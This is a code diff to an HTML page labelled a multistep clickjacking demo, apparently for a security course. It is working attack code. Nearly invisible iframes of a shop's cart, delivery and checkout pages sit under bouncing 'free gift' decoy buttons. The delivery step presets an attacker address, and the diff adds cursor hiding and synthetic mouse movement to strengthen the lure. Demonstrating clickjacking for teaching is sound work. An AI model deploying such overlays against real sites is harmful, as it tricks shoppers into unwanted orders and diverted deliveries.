@@ -6,21 +6,43 @@
     <title>Multistep Clickjacking Demo</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100 font-sans flex flex-col items-center justify-center min-h-screen p-4">
+<body class="bg-gray-100 font-sans flex flex-col items-center justify-center min-h-screen p-4 overflow-hidden">
     <div class="bg-white shadow-lg rounded-lg p-6 max-w-2xl text-center z-10 mb-4">
-        <h1 class="text-3xl font-bold text-gray-800 mb-2">Claim Your Free Gift!</h1>
-        <p class="text-lg text-gray-600">Click the buttons below to get your exclusive offer!</p>
+        <h1 class="text-3xl font-bold text-gray-800 mb-2 animate-pulse">🎁 Claim Your Free Gift Now!</h1>
+        <p class="text-lg text-gray-600">Hurry! Click the buttons below to unlock your exclusive offer!</p>
     </div>
-    <div class="relative w-[600px] h-[800px] z-0">
-        <iframe id="iframe-cart" class="absolute top-0 left-0 w-full h-full opacity-0.2 z-10" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
-        <iframe id="iframe-delivery" class="absolute top-0 left-0 w-full h-full opacity-0.2 z-10 hidden" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" scrolling="no"></iframe>
-        <iframe id="iframe-checkout" class="absolute top-0 left-0 w-full h-full opacity-0.2 z-10 hidden" src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
+    <div id="iframe-wrapper" class="fixed top-[204px] left-1/2 transform -translate-x-1/2 translate-x-[20px] w-[600px] h-[800px] max-w-[90vw] max-h-[80vh] z-0">
+        <iframe id="iframe-cart" class="absolute top-0 left-0 w-full h-full opacity-0.1 z-10 cursor-none" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
+        <iframe id="iframe-delivery" class="absolute top-0 left-0 w-full h-full opacity-0.1 z-10 cursor-none hidden" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" scrolling="no"></iframe>
+        <iframe id="iframe-checkout" class="absolute top-0 left-0 w-full h-full opacity-0.1 z-10 cursor-none hidden" src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
     </div>
-    <div class="firstClick fixed bottom-15 right-50 z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me first</div>
-    <div class="secondClick hidden fixed top-[266px] left-[315px] z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me next</div>
-    <div class="thirdClick hidden fixed bottom-15 right-50 z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me last</div>
+    <div class="firstClick fixed bottom-[40px] right-[40px] z-20 bg-red-500 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:bg-red-600 transition-colors cursor-pointer animate-bounce">Click me first</div>
+    <div id="secondClick" class="secondClick hidden fixed top-[424px] left-[calc(50%+45px)] z-20 bg-red-500 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:bg-red-600 transition-colors cursor-pointer animate-bounce">Click me next</div>
+    <div class="thirdClick hidden fixed bottom-[40px] right-[40px] z-20 bg-red-500 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:bg-red-600 transition-colors cursor-pointer animate-bounce">Click me last</div>
     <script>
         let currentStep = 'cart';
+
+        // Kiểm tra nếu iframe không load
+        function checkIframeLoaded(iframeId) {
+            const iframe = document.getElementById(iframeId);
+            iframe.onerror = () => {
+                alert('Oops! Something went wrong. Please click again to claim your gift!');
+            };
+        }
+
+        // Tự động di chuyển con trỏ đến nút giả
+        function simulateMouseMoveToButton(buttonClass) {
+            const button = document.querySelector(`.${buttonClass}:not(.hidden)`);
+            if (button) {
+                const rect = button.getBoundingClientRect();
+                const mouseEvent = new MouseEvent('mousemove', {
+                    clientX: rect.left + rect.width / 2,
+                    clientY: rect.top + rect.height / 2,
+                    bubbles: true
+                });
+                document.dispatchEvent(mouseEvent);
+            }
+        }
 
         function nextStep(step) {
             document.getElementById(`iframe-${step}`).classList.add('hidden');
@@ -30,14 +52,24 @@
                 currentStep = 'delivery';
                 document.getElementById('iframe-delivery').classList.remove('hidden');
                 document.getElementById('secondClick').classList.remove('hidden');
+                checkIframeLoaded('iframe-delivery');
+                setTimeout(() => simulateMouseMoveToButton('secondClick'), 500);
             } else if (step === 'delivery') {
                 currentStep = 'checkout';
                 document.getElementById('iframe-checkout').classList.remove('hidden');
                 document.getElementById('thirdClick').classList.remove('hidden');
+                checkIframeLoaded('iframe-checkout');
+                setTimeout(() => simulateMouseMoveToButton('thirdClick'), 500);
             } else if (step === 'checkout') {
                 alert('You completed the clickjacking attack!');
             }
         }
+
+        // Kiểm tra iframe đầu tiên và di chuyển con trỏ
+        window.onload = () => {
+            checkIframeLoaded('iframe-cart');
+            setTimeout(() => simulateMouseMoveToButton('firstClick'), 500);
+        };
     </script>
     <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93c3eff54aad8bb6',t:'MTc0NjY1NDY3Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
